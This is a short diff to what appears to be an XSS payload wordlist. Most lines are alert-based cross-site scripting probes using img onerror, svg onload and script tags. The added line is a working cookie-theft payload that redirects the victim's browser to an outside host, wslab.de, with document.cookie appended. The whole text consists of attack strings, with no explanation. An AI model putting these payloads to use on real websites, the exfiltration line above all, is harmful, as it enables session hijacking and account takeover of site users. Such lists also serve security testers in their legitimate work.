@@ -1,6 +1,7 @@
 "><img src=x onerror=alert(0)>
 <svg/onload=alert(domain)>
 "><script>"
+<script>location.href = 'http://wslab.de/x.php?c='+document.cookie;</script>
 <script>alert("WXSS")</script>
 <<script>alert("WXSS");//<</script>
 <script>alert(document.cookie)</script>
